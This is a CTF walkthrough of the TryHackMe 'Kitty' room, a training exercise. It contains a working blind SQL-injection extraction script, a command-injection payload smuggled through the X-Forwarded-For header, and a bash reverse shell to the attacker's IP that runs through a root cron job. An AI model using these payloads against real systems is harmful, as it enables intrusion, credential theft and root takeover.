---
title: 'TryHackMe: Kitty'
author: jaxafed
categories: [TryHackMe]
tags: [web, php, sqli, ssh, cron, command injection]
render_with_liquid: false
media_subpath: /images/tryhackme_kitty/
image:
  path: room_image.webp
---

Kitty started by discovering a SQL injection vulnerability with a simple filter in place. Bypassing the filter, we were able to dump the database and get some credentials. Using these credentials for SSH, we got a shell. Enumerating the machine, we discovered an internal webserver, with the only difference from the first server being logging the SQL injection attempts. After noticing the log file is cleared regularly, monitored the running processes to discover a cron job run by root that backups the log. Using a command injection vulnerability in this backup script, we got a shell as root.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/kitty>_


## Initial enumeration

### Nmap scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.80.186 
Nmap scan report for 10.10.80.186
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:
- 22/SSH
- 80/HTTP

### Web

The webserver appears to be quite simple; it includes login and registration functionality, as well as a welcome page after logging in. There does not seem to be anything else.

- Login (`/index.php`):
![Login page](webserver_login.webp){: width="600" height="400" }

- Register (`/register.php`):
![Register page](webserver_register.webp){: width="600" height="400" }

- After registering an account and logging in (`/welcome.php`):
![Welcome page](webserver_welcome.webp){: width="600" height="400" }

## Shell as kitty

### SQL injection on login

Trying a simple SQL injection on the login page, we get the message: `SQL Injection detected. This incident will be logged!`.

![Webserver SQL filter](webserver_filter.webp){: width="1000" height="350" }

There seems to be a filter. Splitting our payload into parts and trying different parts separately, we see that while `or` is filtered, there is no problem with `'`, `=` and `-- -`.

Also trying other keywords that can help with SQL injection, there does not seem to be a filter for `and`, `select`, `from`, `where`, `(` or `)`.

As long as we have a valid username, we should be able to create a payload that bypasses the filter using `and`. Furthermore, obtaining a valid username is not a problem since we are able to register.

- With the `jxf' and 1=1-- -` payload, it works and we get a redirect to `/welcome.php`.

![SQL query resulting in true](webserver_true_sqli.webp){: width="1000" height="350" }

- And with the `jxf' and 1=2-- -` payload, login fails and response includes: `Invalid username or password`.

![SQL query resulting in false](webserver_false_sqli.webp){: width="1000" height="350" }

This confirms the SQL injection, and we can start modifying the `1=1` part to extract data from the database.

### Dumping the database

To start dumping database names, our payload would be: `jxf' and substr((select schema_name from information_schema.schemata limit 0,1),1,1)="<char_to_test>"-- -`

Explaination for the different parts in the payload:

- Making the first condition of the `and` operator equal true by using a valid username: `jxf'`

- To get all the database names: `select schema_name from information_schema.schemata`

- We add `limit 0,1` to only get the first database name; the first argument is the offset, and the second one is the row count.

- Then we use the `substr` function to only get a single character from the value returned. In this case, `substr(<data>,1,1)` to only get the first character. The second argument is the start index, and the third argument is the length.

- After this, we would loop over every possible character and change the `<char_to_test>` with that. If the payload returned false, the response would include `Invalid username or password`, and by finding the response that does not include this message, we would know the first character of database name.

Now, we would move onto testing the second character by incrementing the start argument in our `substr` function by one, and once again, we would have to try every possible character. After doing this for every character in the current database name and extracting it, we would move onto the second database name by incrementing the offset in the limit clause and doing it over again.

Doing this manually is tedious, so I have written a Python script that does this with minor changes.

>Instead of getting the character and comparing it to another character, I have used the `ord` function to compare their ascii values. This was due to getting false positives with character comparisons related to casing.
{: .prompt-warning }

I have also added some functions: `get_count` to get the count of rows returned from the query and `get_value_len` to get the length of a value before starting to extract it. They are not necessary, but useful.

```python
#!/usr/bin/env python3

import requests

target_url = "http://10.10.80.186/index.php"
valid_username = "jxf"

def send_payload(data):
	r = requests.post(target_url, data=data)
	if "Invalid username or password" not in r.text:
		return True
	return False

def get_count(column, database_table, sql_filter = ""):
	for i in range(1, 10):
		if send_payload({"username":f"{valid_username}' and (select count({column}) from {database_table} {sql_filter})={str(i)}-- -","password":"asd"}):
			return i
	return 0

def get_value_len(index, column, database_table, sql_filter = ""):
	for i in range(1, 30):
		if send_payload({"username":f"{valid_username}' and length((select {column} from {database_table} {sql_filter} limit {str(index)}, 1))={str(i)}-- -","password":"asd"}):
			return i
	return 0

def extract_values(column, database_table, sql_filter = ""):
	values = []
	value_row_count = get_count(column, database_table, sql_filter)
	for value_row_index in range(value_row_count):
		value = ""
		value_len = get_value_len(value_row_index, column, database_table, sql_filter)
		for char_index in range(value_len):
			for char_ord in range(32,127): # Ascii values for non-special characters. 
				if send_payload({"username":f"{valid_username}' and ord(substr((select {column} from {database_table} {sql_filter} limit {str(value_row_index)},1),{str(char_index+1)},1))={str(char_ord)}-- -","password":"asd"}):
					value += chr(char_ord)
		values.append(value)
	return values

# To extract database names
# print(extract_values("schema_name", "information_schema.schemata"))
# ['information_schema', 'performance_schema', 'mywebsite', 'devsite']

# To extract table names for mywebsite database
# print(extract_values("table_name", "information_schema.tables", "where table_schema=\"mywebsite\""))
# ['siteusers']

# To extract columns for siteusers table on mywebsite database
# print(extract_values("column_name", "information_schema.columns", "where table_name=\"siteusers\" and table_schema=\"mywebsite\""))
# ['created_at', 'id', 'password', 'username']

# To extract usernames from siteusers table
print(extract_values("username", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
# To extract passwords from siteusers table
print(extract_values("password", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
```
{: file="sqli.py" }

> Be mindfull that this script will take some time to run. You can add a proxy to the requests made or add print debug staments to confirm it is working correctly.
{: .prompt-info }

Running the script, we get a username and a password.

```console
$ python3 sqli.py          
['kitty']
['<REDACTED>']

```
### Shell via ssh

Trying these credentials against the `SSH` service, they work. We get a shell as `kitty` user and can read the user flag.

```console
$ ssh kitty@10.10.80.186 
kitty@10.10.80.186's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)
...
Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@kitty:~$ wc -c user.txt
38 user.txt
```

## Shell as root

### Discovering the development server

Checking for listening ports, we see that port `8080` is listening on `127.0.0.1`.

```console
kitty@kitty:~$ ss -tulpn
Netid      State       Recv-Q       Send-Q                 Local Address:Port              Peer Address:Port      Process      
...                     
tcp        LISTEN      0            511                        127.0.0.1:8080                   0.0.0.0:*                      
...
```

Connecting to it, it seems to be another Apache webserver.

```
kitty@kitty:~$ nc 127.0.0.1 8080

HTTP/1.1 400 Bad Request
Date: Sat, 03 Feb 2024 17:13:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at localhost Port 8080</address>
</body></html>
```

We find the configuration for it at `/etc/apache2/sites-enabled/dev_site.conf`.

```
Listen 127.0.0.1:8080
<VirtualHost 127.0.0.1:8080>
        ...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/development
        ...
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        ...
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
{: file="/etc/apache2/sites-enabled/dev_site.conf"}

### Enumerating the development server

Checking the source code of the development server at `/var/www/development`, it is similar to the first webserver, with the only difference being the logging of SQL injection attempts on `/index.php`.

```console
kitty@kitty:~$ diff /var/www/html /var/www/development
diff /var/www/html/config.php /var/www/development/config.php
7c7
< define('DB_NAME', 'mywebsite');
---
> define('DB_NAME', 'devsite');
diff /var/www/html/index.php /var/www/development/index.php
18a19,21
>               $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
>               $ip .= "\n";
>               file_put_contents("/var/www/development/logged", $ip);
21c24,27
<               echo 'SQL Injection detected. This incident will be logged!';
---
>               echo 'SQL Injection detected. This incident will be logged!';
>               $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
>               $ip .= "\n";
>               file_put_contents("/var/www/development/logged", $ip);
61c67
<         <h2>User Login</h2>
---
>         <h2>Development User Login</h2>
Only in /var/www/development: logged
```

If it detects a SQL injection attempt, it writes the value of the `X-Forwarded-For` header in the request to the `/var/www/development/logged`.

```php
...
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
}
...
```
{: file="/var/www/development/index.php"}

Sending a request with the header mentioned and a payload that will trigger this logging using `curl`.

```console
kitty@kitty:/var/www/development$ curl -s 'http://127.0.0.1:8080/index.php' -X POST -d 'username=sleep&password=password' -H 'X-Forwarded-For: test'

SQL Injection detected. This incident will be logged!
kitty@kitty:/var/www/development$ cat logged
test
```

After spending some time, we notice that the `logged` file is cleared every minute.

![Log file clearing](log_file_clear.webp){: width="400" height="100" }

### Monitoring the processes

Getting another shell via SSH and running `pspy` in this shell to find the process responsible for clearing the log.

We see there is a cronjob that runs `/opt/log_checker.sh` as `root`.

```console
2024/02/03 17:32:01 CMD: UID=0     PID=3293   | /usr/sbin/CRON -f 
2024/02/03 17:32:01 CMD: UID=0     PID=3295   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/02/03 17:32:01 CMD: UID=0     PID=3296   | /usr/bin/bash /opt/log_checker.sh 
```

We are able to read the `/opt/log_checker.sh` script run by `root`.

```bash
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```
{: file="/opt/log_checker.sh"}

Basically, the script reads the `/var/www/development/logged` line by line and calls `/usr/bin/sh -c "echo $ip >> /root/logged"` for every line, with the read line being the `$ip` parameter, and after that, it clears the `/var/www/development/logged` file.

### Shell via command injection

Since we are able to control what is written to the `/var/www/development/logged` file with the `X-Forwarded-For` header, we can control the `$ip` parameter and inject commands.

Creating a reverse shell at `/tmp/lol` and making it executable.

```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.11.63.57/443 0>&1"
```
{: file="/tmp/lol"}

Starting our listener.

```console
$ nc -lvnp 443
listening on [any] 443 ...
```

Sending our command injection payload: `;/tmp/lol #`

- `;` to escape the echo command.
- `/tmp/lol`: command we want to inject.
- `#`: to comment out the rest of the command.

```console
kitty@kitty:/var/www/development$ curl -s 'http://127.0.0.1:8080/index.php' -X POST -d 'username=sleep&password=password' -H 'X-Forwarded-For: ;/tmp/lol #'

SQL Injection detected. This incident will be logged!
```

With this payload, `;/tmp/lol #` will be written to `/var/www/development/logged` and the command inside `/opt/log_checker.sh` will be `/usr/bin/sh -c "echo ;/tmp/lol # >> /root/logged"`.

We see the execution of our payload with `pspy`.

```
2024/02/03 18:07:01 CMD: UID=0     PID=3590   | /usr/sbin/CRON -f 
2024/02/03 18:07:01 CMD: UID=0     PID=3591   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2024/02/03 18:07:01 CMD: UID=0     PID=3592   | /usr/bin/bash /opt/log_checker.sh 
2024/02/03 18:07:01 CMD: UID=0     PID=3593   | /usr/bin/sh -c echo ;/tmp/lol # >> /root/logged 
2024/02/03 18:07:01 CMD: UID=0     PID=3594   | /bin/bash /tmp/lol 
2024/02/03 18:07:01 CMD: UID=0     PID=3595   | bash -c bash -i >& /dev/tcp/10.11.63.57/443 0>&1 
```

On our listener, we receive a shell as root and can read the root flag.

```console
root@kitty:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kitty:~# wc -c root.txt
38 root.txt
```